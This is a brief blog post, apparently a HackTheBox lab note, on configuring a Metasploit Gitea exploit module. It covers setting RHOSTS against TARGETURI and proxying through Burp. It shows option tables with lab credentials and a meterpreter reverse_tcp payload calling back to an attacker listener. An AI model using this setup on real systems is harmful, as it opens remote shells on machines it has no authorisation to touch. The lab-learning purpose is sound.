+++
author = "Frenchie"
title = "Extension HTB"
date = "2023-03-20"
description = "RainyDay HTB"
tags = [
    "Gaming",
    "Hacking",
]
showthedate = false
+++

set RHOST vs TARGETURI in MSFDB

<!--more-->

with:
```text
   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   PASSWORD   spiderman            yes       Password to use
   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     dev.snippet.htb      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80                   yes       The target port (TCP)
   SSL        false                no        Negotiate SSL/TLS for outgoing connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                    yes       The base path to the gitea application
   URIPATH    /                    no        The URI to use for this exploit
   USERNAME   spider               yes       Username to authenticate with
   VHOST                           no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.70      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8002             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.70      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

MSF will send like:
```text
GET / HTTP/1.1
Host: dev.snippet.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
```

> Which is the correct request.

#### But with RHOST 10.10.11.171
```text
   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   PASSWORD   spiderman            yes       Password to use
   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.11.171         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80                   yes       The target port (TCP)
   SSL        false                no        Negotiate SSL/TLS for outgoing connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  dev.snippet.htb      yes       The base path to the gitea application
   URIPATH    /                    no        The URI to use for this exploit
   USERNAME   spider               yes       Username to authenticate with
   VHOST                           no        HTTP server virtual host

```

MSF will send:
```text
GET /dev.snippet.htb HTTP/1.1
Host: 10.10.11.171
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close

```

> which is wrong request and will get response: HTTP/1.1 404 Not Found

### How to set MSF to send request through BURP suite
```text
set Proxies http:127.0.0.1:8080
```

> FORMAT type:host:port
>
> NOT `set Proxies True` like the fucking AI said.